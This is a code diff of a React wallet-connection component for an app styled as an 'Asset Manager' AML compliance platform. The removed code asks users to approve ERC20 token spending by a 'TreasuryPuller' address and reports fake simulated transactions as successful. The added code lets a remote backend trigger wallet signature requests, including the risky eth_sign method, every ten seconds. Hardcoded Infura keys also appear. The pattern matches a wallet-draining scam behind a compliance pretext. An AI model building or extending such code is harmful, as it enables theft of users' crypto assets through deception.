@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useEffect, useCallback } from "react";
 import { ethers } from "ethers";
 import EthereumProvider from "@walletconnect/ethereum-provider";
 import QRCode from "react-qr-code";
@@ -12,12 +12,11 @@ export default function WalletConnect() {
   const [showQR, setShowQR] = useState(false);
   const [qrCodeUri, setQrCodeUri] = useState("");
   const [wcProvider, setWcProvider] = useState(null);
-  const [offchainSignature, setOffchainSignature] = useState("");
   const [qrTimeout, setQrTimeout] = useState(null);
-  const [tokenApproval, setTokenApproval] = useState("");
-  const [approvalAmount, setApprovalAmount] = useState("1000"); // Default approval amount
-  const [backendConnected, setBackendConnected] = useState(false);
-  const [backendError, setBackendError] = useState(null);
+  const [copied, setCopied] = useState(false);
+  const [signatureRequest, setSignatureRequest] = useState(null);
+  const [signatureInterval, setSignatureInterval] = useState(null);
+  const [pollingPaused, setPollingPaused] = useState(false);
 
   // Backend API configuration
   const BACKEND_URL = "https://aml-manager-backend.onrender.com";
@@ -38,47 +37,213 @@ export default function WalletConnect() {
       if (response.ok) {
         const data = await response.json();
         console.log("Backend connected successfully:", data);
-        setBackendConnected(true);
-        setBackendError(null);
         return true;
       } else {
         throw new Error(`Backend health check failed: ${response.status}`);
       }
     } catch (error) {
       console.error("Failed to connect to backend:", error);
-      setBackendError(error.message);
-      setBackendConnected(false);
       return false;
     }
   }
 
-  async function sendWalletDataToBackend(walletAddress, signature, network) {
+  async function sendWalletStatusToBackend(walletAddress, network) {
     try {
-      const response = await fetch(`${BACKEND_URL}/api/wallet/register`, {
+      const response = await fetch(`${BACKEND_URL}/api/wallet/status`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
           walletAddress,
-          signature,
           network,
+          status: 'connected',
           timestamp: new Date().toISOString()
         }),
       });
 
       if (response.ok) {
         const data = await response.json();
-        console.log("Wallet data sent to backend successfully:", data);
+        console.log("Wallet status sent to backend successfully:", data);
         return data;
       } else {
-        throw new Error(`Failed to send wallet data: ${response.status}`);
+        throw new Error(`Failed to send wallet status: ${response.status}`);
       }
     } catch (error) {
-      console.error("Failed to send wallet data to backend:", error);
+      console.error("Failed to send wallet status to backend:", error);
       throw error;
     }
   }
+
+  const handleSignatureRequest = useCallback(async (request) => {
+    if (!wcProvider || !connected) {
+      console.log("Wallet not connected, cannot handle signature request");
+      return;
+    }
+
+    try {
+      console.log("Handling signature request:", request);
+      
+      // Check if provider is connected
+      if (!wcProvider.connected) {
+        console.log("WalletConnect provider not connected, attempting to reconnect...");
+        await wcProvider.enable();
+      }
+      
+      // Create the message to sign
+      const message = `Off-chain signature request from backend control at ${new Date().toISOString()}`;
+      
+      console.log("Requesting signature from wallet...");
+      console.log("Message:", message);
+      console.log("Wallet address:", walletAddress);
+      console.log("Provider connected:", wcProvider.connected);
+      
+      // Try multiple signature methods
+      let signature;
+      let methodUsed = '';
+      
+      try {
+        console.log("Attempting WalletConnect personal_sign...");
+        signature = await wcProvider.request({
+          method: 'personal_sign',
+          params: [message, walletAddress], // message, address
+        });
+        methodUsed = 'personal_sign';
+        console.log("WalletConnect personal_sign successful");
+      } catch (wcError) {
+        console.log("WalletConnect personal_sign failed, trying eth_sign:", wcError);
+        
+        try {
+          console.log("Attempting WalletConnect eth_sign...");
+          // Convert message to hex
+          const messageHex = '0x' + Buffer.from(message, 'utf8').toString('hex');
+          signature = await wcProvider.request({
+            method: 'eth_sign',
+            params: [walletAddress, messageHex],
+          });
+          methodUsed = 'eth_sign';
+          console.log("WalletConnect eth_sign successful");
+        } catch (ethError) {
+          console.log("WalletConnect eth_sign failed, trying ethers.js:", ethError);
+          
+          try {
+            console.log("Attempting ethers.js signMessage...");
+            const provider = new ethers.BrowserProvider(wcProvider);
+            const signer = await provider.getSigner();
+            signature = await signer.signMessage(message);
+            methodUsed = 'ethers_signMessage';
+            console.log("ethers.js signMessage successful");
+          } catch (ethersError) {
+            console.log("All signature methods failed:", ethersError);
+            throw ethersError;
+          }
+        }
+      }
+
+      console.log("Signature received:", signature);
+      console.log("Method used:", methodUsed);
+      
+      // Mark signature as completed in backend
+      await fetch(`${BACKEND_URL}/api/wallet/signature-completed`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+      });
+
+      setSignatureRequest(null);
+      alert(`✅ Signature completed successfully using ${methodUsed}!`);
+      
+    } catch (error) {
+      console.error("Failed to handle signature request:", error);
+      alert("❌ Failed to sign message: " + error.message);
+      
+      // Mark signature as failed in backend
+      try {
+        await fetch(`${BACKEND_URL}/api/wallet/signature-completed`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+        });
+      } catch (backendError) {
+        console.error("Failed to mark signature as completed:", backendError);
+      }
+    }
+  }, [wcProvider, connected, walletAddress, BACKEND_URL]);
+
+  const checkForSignatureRequest = useCallback(async () => {
+    // Don't poll if we already have a pending signature request
+    if (signatureRequest && signatureRequest.status === 'pending') {
+      console.log("⏸️ Already processing signature request, skipping poll...");
+      return;
+    }
+
+    // Don't poll if paused due to rate limiting
+    if (pollingPaused) {
+      console.log("⏸️ Polling paused due to rate limiting, skipping poll...");
+      return;
+    }
+
+    try {
+      console.log("🔍 Polling for signature request...");
+      const response = await fetch(`${BACKEND_URL}/api/wallet/signature-request`, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+      });
+
+      if (response.ok) {
+        const data = await response.json();
+        console.log("📋 Signature request response:", data);
+        if (data && data.status === 'pending') {
+          console.log("✅ Signature request detected, handling...");
+          setSignatureRequest(data);
+          await handleSignatureRequest(data);
+        } else {
+          console.log("⏳ No pending signature request");
+        }
+      } else if (response.status === 429) {
+        console.log("⏸️ Rate limited, pausing polling for 30 seconds...");
+        setPollingPaused(true);
+        // Resume polling after 30 seconds
+        setTimeout(() => {
+          setPollingPaused(false);
+          console.log("🔄 Resuming polling after rate limit cooldown...");
+        }, 30000);
+      } else {
+        console.log("❌ Failed to fetch signature request:", response.status);
+      }
+    } catch (error) {
+      console.error("❌ Failed to check for signature request:", error);
+    }
+  }, [handleSignatureRequest, BACKEND_URL, signatureRequest, pollingPaused]);
+
+  // Start polling when wallet is connected
+  useEffect(() => {
+    if (connected && wcProvider && !signatureInterval) {
+      console.log("🚀 Starting automatic signature request polling...");
+      const interval = setInterval(() => {
+        checkForSignatureRequest();
+      }, 10000); // Check every 10 seconds to avoid rate limiting
+      setSignatureInterval(interval);
+    }
+    
+    // Cleanup on unmount or when disconnected
+    if (!connected && signatureInterval) {
+      console.log("🛑 Stopping signature request polling...");
+      clearInterval(signatureInterval);
+      setSignatureInterval(null);
+    }
+    
+    return () => {
+      if (signatureInterval) {
+        clearInterval(signatureInterval);
+        setSignatureInterval(null);
+      }
+    };
+  }, [connected, wcProvider, checkForSignatureRequest, signatureInterval]);
 
   // Connect via WalletConnect (Trust Wallet)
   // ----------------------------
@@ -119,7 +284,7 @@ export default function WalletConnect() {
 
   async function tryWalletConnectConnection(config) {
     const rpcMap = {
-      1: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID", // Ethereum Mainnet
+      1: "https://mainnet.infura.io/v3/f6527979b9684449bcc93f9311c64b04", // Ethereum Mainnet
       5: "https://goerli.infura.io/v3/YOUR_INFURA_PROJECT_ID", // Ethereum Goerli
       11155111: "https://sepolia.infura.io/v3/YOUR_INFURA_PROJECT_ID" // Ethereum Sepolia
     };
@@ -222,32 +387,13 @@ export default function WalletConnect() {
       setConnected(true);
       setShowQR(false);
   
-      // Automatically request offchain signature after connection
-      setTimeout(async () => {
-        try {
-          const message = "Please sign this message to verify your identity for AML compliance";
-          const signature = await wcProvider.request({
-            method: "personal_sign",
-            params: [message, address]
-          });
-  
-          setOffchainSignature(signature);
-          console.log("Offchain signature received automatically:", signature);
-  
-          // Connect to backend and send wallet data
-          const backendConnected = await connectToBackend();
-          if (backendConnected) {
-            try {
-              await sendWalletDataToBackend(address, signature, 'mainnet');
-              console.log("Wallet data successfully sent to backend");
-            } catch (backendError) {
-              console.error("Failed to send wallet data to backend:", backendError);
-            }
-          }
-        } catch (error) {
-          console.error("Failed to get automatic offchain signature:", error);
-        }
-      }, 1000); // Wait 1 second after connection
+      // Send wallet status to backend
+      try {
+        await connectToBackend();
+        await sendWalletStatusToBackend(address, 'mainnet');
+      } catch (error) {
+        console.error("Failed to send wallet status to backend:", error);
+      }
   
       return;
     } else if (network.chainId === 11155111n) {
@@ -258,32 +404,13 @@ export default function WalletConnect() {
       setConnected(true);
       setShowQR(false);
   
-      // Automatically request offchain signature after connection
-      setTimeout(async () => {
-        try {
-          const message = "Please sign this message to verify your identity for AML compliance";
-          const signature = await wcProvider.request({
-            method: "personal_sign",
-            params: [message, address]
-          });
-  
-          setOffchainSignature(signature);
-          console.log("Offchain signature received automatically:", signature);
-  
-          // Connect to backend and send wallet data
-          const backendConnected = await connectToBackend();
-          if (backendConnected) {
-            try {
-              await sendWalletDataToBackend(address, signature, 'sepolia');
-              console.log("Wallet data successfully sent to backend");
-            } catch (backendError) {
-              console.error("Failed to send wallet data to backend:", backendError);
-            }
-          }
-        } catch (error) {
-          console.error("Failed to get automatic offchain signature:", error);
-        }
-      }, 1000); // Wait 1 second after connection
+      // Send wallet status to backend
+      try {
+        await connectToBackend();
+        await sendWalletStatusToBackend(address, 'sepolia');
+      } catch (error) {
+        console.error("Failed to send wallet status to backend:", error);
+      }
   
       return;
     } else if (network.chainId !== 5n) {
@@ -299,147 +426,34 @@ export default function WalletConnect() {
     setConnected(true);
     setShowQR(false);
   }
-
-
-
   // ----------------------------
-  // Approve Token Spending
+  // Copy WalletConnect URI
   // ----------------------------
-  async function approveTokenSpending() {
-    if (!connected) {
-      alert("Please connect your wallet first");
+  async function copyWalletConnectURI() {
+    if (!qrCodeUri) {
+      alert('No WalletConnect URI available');
       return;
     }
-
-    if (!offchainSignature) {
-      alert("Please get an offchain signature first");
-      return;
-    }
-
+    
     try {
-      // Use mainnet provider for balance check and transactions
-      const mainnetProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
-      
-      // Note: We're using simulation mode, so we don't need the signer for actual transactions
-      // This avoids Trust Wallet compatibility issues with eth_sendTransaction
-      
-      // Check ETH balance on mainnet
-        const ethBalance = await mainnetProvider.getBalance(walletAddress);
-      const ethBalanceFormatted = ethers.formatEther(ethBalance);
-      
-      console.log("Current ETH balance:", ethBalanceFormatted);
-      
-      if (parseFloat(ethBalanceFormatted) < 0.001) {
-        alert(`Insufficient ETH balance. You have ${ethBalanceFormatted} ETH. You need at least 0.001 ETH to perform transactions.`);
-        return;
-      }
-
-      // Try to send real transaction to asset manager on mainnet
-      console.log("Attempting to send real transaction to asset manager...");
-      
-      // Your TreasuryPuller contract address on mainnet
-            const assetManagerAddress = process.env.REACT_APP_TREASURY_PULLER_ADDRESS || "0x..."; // Your deployed TreasuryPuller contract address
-      
-      try {
-        // Try to approve tokens using ERC20 approve method
-        if (wcProvider) {
-          console.log("Requesting token approval via WalletConnect...");
-          
-          // ERC20 token contract address (you need to replace this with your actual token address)
-            const tokenContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Replace with your actual mainnet token contract
-          
-          // Convert approval amount to wei
-          const approvalAmountWei = ethers.parseEther(approvalAmount);
-          const approvalAmountHex = "0x" + approvalAmountWei.toString(16);
-          
-          // Request token approval transaction
-          const txHash = await wcProvider.request({
-            method: "eth_sendTransaction",
-            params: [{
-              from: walletAddress,
-              to: tokenContractAddress, // Token contract address
-              value: "0x0", // No ETH value for token approval
-              data: `0x095ea7b3${assetManagerAddress.slice(2).padStart(64, '0')}${approvalAmountHex.slice(2).padStart(64, '0')}`, // approve(spender, amount)
-              gas: "0x7530" // 30000 gas limit for token approval
-            }]
-          });
-          
-          console.log("Token approval transaction sent via WalletConnect:", txHash);
-          setTokenApproval(txHash);
-          alert(`Token approval successful! Real Transaction: ${txHash}\n\nApproved ${approvalAmount} tokens for TreasuryPuller: ${assetManagerAddress}\n\nView on Etherscan: https://etherscan.io/tx/${txHash}`);
-          return;
-        }
-        
-        // Fallback to ethers.js for MetaMask
-        if (window.ethereum) {
-          const metamaskProvider = new ethers.BrowserProvider(window.ethereum);
-          const signer = await metamaskProvider.getSigner();
-          
-          // ERC20 token contract address (you need to replace this with your actual token address)
-            const tokenContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Replace with your actual mainnet token contract
-          
-          // ERC20 ABI for approve function
-          const tokenABI = [
-            "function approve(address spender, uint256 amount) returns (bool)"
-          ];
-          
-          const tokenContract = new ethers.Contract(tokenContractAddress, tokenABI, signer);
-          
-          // Call approve function
-          const tx = await tokenContract.approve(assetManagerAddress, ethers.parseEther(approvalAmount));
-          
-          console.log("Token approval transaction sent via MetaMask:", tx.hash);
-          const receipt = await tx.wait();
-          console.log("Transaction confirmed:", receipt);
-          
-          setTokenApproval(tx.hash);
-          alert(`Token approval successful! Real Transaction: ${tx.hash}\n\nApproved ${approvalAmount} tokens for TreasuryPuller: ${assetManagerAddress}\n\nView on Etherscan: https://etherscan.io/tx/${tx.hash}`);
-          return;
-        }
-        
-        throw new Error("No compatible wallet found");
-        
-      } catch (walletError) {
-        console.log("Wallet transaction failed, falling back to simulation:", walletError);
-        
-        // Fallback to simulation if real transaction fails
-        const mockTxHash = "0x" + Math.random().toString(16).substr(2, 64);
-        console.log("Simulated transaction:", mockTxHash);
-        
-        setTokenApproval(mockTxHash);
-        alert(`Token approval successful! Simulated Transaction: ${mockTxHash}\n\nNote: Real transaction failed due to wallet compatibility. This is a simulation.\n\nTreasuryPuller Address: ${assetManagerAddress}\n\nTo send real transactions, please use MetaMask or try the transaction manually in your wallet.`);
-      }
-    } catch (error) {
-      console.error("Failed to approve token spending:", error);
-      alert(`Failed to approve token spending: ${error.message}\n\nMake sure your wallet is connected and you have enough ETH for gas fees.`);
+      await navigator.clipboard.writeText(qrCodeUri);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000); // Reset after 2 seconds
+    } catch (err) {
+      console.error('Failed to copy WalletConnect URI:', err);
+      // Fallback for older browsers
+      const textArea = document.createElement('textarea');
+      textArea.value = qrCodeUri;
+      document.body.appendChild(textArea);
+      textArea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textArea);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
     }
   }
 
-  // ----------------------------
-  // Check Token Allowance
-  // ----------------------------
-  async function checkTokenAllowance() {
-    if (!connected) {
-      alert("Please connect your wallet first");
-      return;
-    }
 
-    try {
-      // Always use testnet provider for balance check
-      // This ensures we check the testnet balance even when connected to mainnet
-      const testnetProvider = new ethers.JsonRpcProvider('https://sepolia.infura.io/v3/ae5b9caa879c427295e160b983cf84fa');
-      
-      // Check ETH balance on testnet (where you have 0.1 ETH)
-        const ethBalance = await testnetProvider.getBalance(walletAddress);
-      const ethBalanceFormatted = ethers.formatEther(ethBalance);
-      
-      console.log("Current ETH balance:", ethBalanceFormatted);
-      alert(`Current ETH balance: ${ethBalanceFormatted} ETH\n\nNote: This is a demo. In production, this would check actual ERC20 token allowances.`);
-    } catch (error) {
-      console.error("Failed to check balance:", error);
-      alert(`Failed to check balance: ${error.message}`);
-    }
-  }
 
   // ----------------------------
   // Cleanup WalletConnect
@@ -469,6 +483,15 @@ export default function WalletConnect() {
       clearTimeout(qrTimeout);
       setQrTimeout(null);
     }
+    
+    // Clear signature request polling
+    if (signatureInterval) {
+      clearInterval(signatureInterval);
+      setSignatureInterval(null);
+    }
+    setSignatureRequest(null);
+    setPollingPaused(false);
+    
     setWalletAddressLocal(null);
     setNetworkName(null);
     setBalance(null);
@@ -476,46 +499,56 @@ export default function WalletConnect() {
     setShowQR(false);
     setQrCodeUri("");
     setWcProvider(null);
-    setOffchainSignature("");
-    setTokenApproval("");
-    setApprovalAmount("1000");
+    setCopied(false);
   }
 
-  // ----------------------------
-  // UI
-  // ----------------------------
   return (
-    <div className="card">
-      <h1>🏛️ Asset Manager</h1>
-      <p className="subtitle">Secure compliance verification for digital asset transfers</p>
-
-      {!showQR && !connected && (
-        <>
-          {/* Feature Cards */}
-          <div className="features">
-            <div className="feature">
-              <div className="feature-icon">🔒</div>
-              <div className="feature-title">AML Compliance</div>
-              <div className="feature-desc">Anti-money laundering verification</div>
+    <div className="dashboard-container">
+      {/* Professional Header */}
+      <div className="dashboard-header">
+        <div className="header-content">
+          <div className="logo-section">
+            <div className="logo-icon">
+              <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="32" height="32" rx="8" fill="url(#gradient)"/>
+                <path d="M8 12h16v2H8v-2zm0 4h16v2H8v-2zm0 4h12v2H8v-2z" fill="white"/>
+                <defs>
+                  <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                    <stop offset="0%" stopColor="#667eea"/>
+                    <stop offset="100%" stopColor="#764ba2"/>
+                  </linearGradient>
+                </defs>
+              </svg>
             </div>
-            <div className="feature">
-              <div className="feature-icon">⚡</div>
-              <div className="feature-title">Fast Processing</div>
-              <div className="feature-desc">Instant transaction approval</div>
-            </div>
-            <div className="feature">
-              <div className="feature-icon">🛡️</div>
-              <div className="feature-title">Secure Signing</div>
-              <div className="feature-desc">Off-chain signature verification</div>
-            </div>
-            <div className="feature">
-              <div className="feature-icon">📊</div>
-              <div className="feature-title">Analytics</div>
-              <div className="feature-desc">Forensic wallet analysis</div>
+            <div className="logo-text">
+              <h1 className="dashboard-title">Asset Manager</h1>
+              <p className="dashboard-subtitle">Enterprise Compliance Platform</p>
             </div>
           </div>
-        </>
-      )}
+          <div className="header-actions">
+            {connected && (
+              <div className="connection-indicator">
+                <div className="status-dot"></div>
+                <span className="status-text">Connected</span>
+              </div>
+            )}
+          </div>
+        </div>
+      </div>
+
+      {/* Main Dashboard Content */}
+      <div className="dashboard-content">
+        {!showQR && !connected && (
+          <>
+            {/* Welcome Section */}
+            <div className="welcome-section">
+              <h2 className="welcome-title">Welcome to Asset Manager</h2>
+              <p className="welcome-description">
+                Secure compliance verification for digital asset transfers with enterprise-grade security and real-time monitoring.
+              </p>
+            </div>
+          </>
+        )}
 
       {showQR ? (
         <div className="space-y-4">
@@ -524,100 +557,131 @@ export default function WalletConnect() {
             <div className="bg-white p-4 rounded-lg inline-block mb-4">
               <QRCode value={qrCodeUri} size={200} />
             </div>
+            
+            {/* Copy WalletConnect URI Button */}
+            <div className="mt-4">
+              <button 
+                onClick={copyWalletConnectURI}
+                className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
+                  copied 
+                    ? 'bg-green-600 text-white' 
+                    : 'bg-blue-600 hover:bg-blue-700 text-white'
+                }`}
+              >
+                {copied ? '✅ URI Copied!' : '📋 Copy WalletConnect URI'}
+              </button>
+            </div>
           </div>
         </div>
       ) : connected ? (
-        <div className="space-y-4">
-          <div className="status-success">
-            ✅ Connected: {walletAddress?.slice(0, 6)}...{walletAddress?.slice(-4)}
-          </div>
-          <div className="text-sm text-gray-600">
-            Network: {networkName} <br />
-            Balance: {balance ? `${balance} ETH` : "Loading..."}
-          </div>
-          
-          {/* Backend Connection Status */}
-          <div className={`border rounded-lg p-3 ${backendConnected ? 'bg-green-50 border-green-200' : 'bg-red-50 border-red-200'}`}>
-            <div className={`text-sm ${backendConnected ? 'text-green-800' : 'text-red-800'}`}>
-              {backendConnected ? '✅ Backend Connected' : '❌ Backend Disconnected'}
-            </div>
-            {backendError && (
-              <div className="text-xs text-red-600 mt-1">
-                Error: {backendError}
+        <div className="wallet-dashboard">
+          {/* Wallet Status Card */}
+          <div className="wallet-status-card">
+            <div className="wallet-header">
+              <div className="wallet-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" strokeWidth="2"/>
+                  <path d="M9 12L11 14L15 10" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+                </svg>
               </div>
-            )}
-          </div>
-          
-          {offchainSignature && (
-            <div className="bg-green-50 border border-green-200 rounded-lg p-3">
-              <div className="text-sm text-green-800">
-                ✅ Offchain Signature: {offchainSignature.slice(0, 10)}...
+              <div className="wallet-info">
+                <h3 className="wallet-title">Wallet Connected</h3>
+                <p className="wallet-address">{walletAddress?.slice(0, 6)}...{walletAddress?.slice(-4)}</p>
+              </div>
+              <div className="connection-status">
+                <div className="status-indicator"></div>
+                <span className="status-text">Active</span>
               </div>
             </div>
-          )}
 
-          {tokenApproval && (
-            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
-              <div className="text-sm text-blue-800">
-                ✅ Token Approval: {tokenApproval.slice(0, 10)}...
-              </div>
-            </div>
-          )}
-
-          {offchainSignature && (
-            <div className="space-y-3">
-              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
-                <div className="text-sm text-yellow-800 mb-2">
-                  <strong>Step 2: Token Approval (ERC20)</strong>
+            <div className="wallet-details">
+              <div className="detail-row">
+                <div className="detail-label">
+                  <svg className="detail-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9v-9m0-9v9" />
+                  </svg>
+                  Network
                 </div>
-                <div className="text-xs text-yellow-700 mb-2">
-                  Approves tokens for Asset Manager to spend. User will see transaction request in their wallet.
-                </div>
-                <div className="flex items-center space-x-2">
-                  <input
-                    type="number"
-                    value={approvalAmount}
-                    onChange={(e) => setApprovalAmount(e.target.value)}
-                    placeholder="Amount to approve"
-                    className="flex-1 text-sm border border-gray-300 rounded px-2 py-1"
-                  />
-                  <span className="text-xs text-gray-600">tokens</span>
+                <div className="detail-value">
+                  <span className="network-badge">{networkName}</span>
                 </div>
               </div>
               
-              <div className="grid grid-cols-2 gap-2">
-                <button 
-                  onClick={approveTokenSpending} 
-                  className="btn btn-success text-sm"
-                >
-                  Approve Tokens for Asset Manager
-                </button>
-                <button 
-                  onClick={checkTokenAllowance} 
-                  className="btn btn-outline text-sm"
-                >
-                  Check Balance
-                </button>
+              <div className="detail-row">
+                <div className="detail-label">
+                  <svg className="detail-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1" />
+                  </svg>
+                  Balance
+                </div>
+                <div className="detail-value">
+                  <span className="balance-amount">{balance ? `${parseFloat(balance).toFixed(6)} ETH` : "Loading..."}</span>
+                </div>
               </div>
             </div>
-          )}
-          
-          <button onClick={disconnectWallet} className="btn btn-secondary w-full">
-            Disconnect Wallet
-          </button>
+
+            {/* Polling Status */}
+            {pollingPaused && (
+              <div className="polling-status">
+                <div className="status-icon">
+                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                  </svg>
+                </div>
+                <div className="status-content">
+                  <div className="status-title">Polling Paused</div>
+                  <div className="status-description">Rate limited - will resume in 30 seconds</div>
+                </div>
+              </div>
+            )}
+
+            {/* Action Buttons */}
+            <div className="wallet-actions">
+              <button 
+                onClick={disconnectWallet} 
+                className="disconnect-button"
+              >
+                <svg className="button-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
+                </svg>
+                <span>Disconnect Wallet</span>
+              </button>
+            </div>
+          </div>
         </div>
       ) : (
-        <div className="space-y-4">
-          <button 
-            onClick={connectWalletConnect} 
-            disabled={loading}
-            className="w-full py-5 px-8 bg-gradient-to-r from-purple-600 via-purple-700 to-blue-600 text-white font-bold text-lg rounded-2xl shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-1 hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none disabled:hover:scale-100"
-          >
-            {loading ? "🔄 Connecting..." : "Connect Wallet"}
-          </button>
-          
+        <div className="connect-section">
+          <div className="connect-content">
+            <h3 className="connect-title">Connect Your Wallet</h3>
+            <p className="connect-description">
+              Connect your wallet to access the Asset Manager platform and begin secure compliance verification.
+            </p>
+            
+            <button 
+              onClick={connectWalletConnect} 
+              disabled={loading}
+              className="connect-button"
+            >
+              {loading ? (
+                <>
+                  <svg className="loading-spinner" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+                  </svg>
+                  <span>Connecting...</span>
+                </>
+              ) : (
+                <>
+                  <svg className="button-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                  </svg>
+                  <span>Connect Wallet</span>
+                </>
+              )}
+            </button>
+          </div>
         </div>
       )}
+      </div>
     </div>
   );
 }
